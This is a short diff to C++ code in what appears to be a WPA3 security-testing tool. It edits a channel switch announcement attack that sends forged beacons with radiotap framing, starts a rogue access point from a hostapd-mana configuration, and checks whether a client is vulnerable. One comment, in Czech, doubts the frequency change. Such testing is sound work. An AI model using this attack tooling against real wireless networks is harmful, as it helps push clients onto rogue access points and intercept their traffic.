@@ -44,9 +44,10 @@ namespace wpa3_tester::CSA_attack{
         beacon.channel_switch(cs);
 
         RadioTap radiotap;
-        const int freq_mhz = hw_capabilities::channel_to_freq(ap_channel);
+        const int freq_mhz = hw_capabilities::channel_to_freq(new_channel); //FIXME tohle bylo ap_channel a CSA fungoval, ael asi je to ted správně
         radiotap.channel(freq_mhz, RadioTap::OFDM);
         radiotap.inner_pdu(beacon);
+        radiotap.flags(RadioTap::FCS); // check FCS (can be invalid for some drivers)
 
         PacketSender sender;
         sender.send(radiotap, iface);
@@ -83,6 +84,10 @@ namespace wpa3_tester::CSA_attack{
     // ----------------- MODULE functions ------------------
     void setup_chs_attack(RunStatus& rs){
         if(rs.config.at("actors").contains("rogue_ap")){
+            copy_file(
+                path(rs.config_path).parent_path()/"hostapd-mana.conf",
+                path(rs.run_folder)/"rogue_ap_hostapd_mana.conf"
+            );
             program::start(rs, "rogue_ap");
             rs.process_manager.wait_for("rogue_ap", "AP-ENABLED", seconds(30));
             log(LogLevel::INFO, "Rogue AP up");
@@ -109,6 +114,7 @@ namespace wpa3_tester::CSA_attack{
         check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
         log(LogLevel::INFO, "Attack END");
         this_thread::sleep_for(seconds(10));
+
     }
 
     // ---------- STATS ----------------
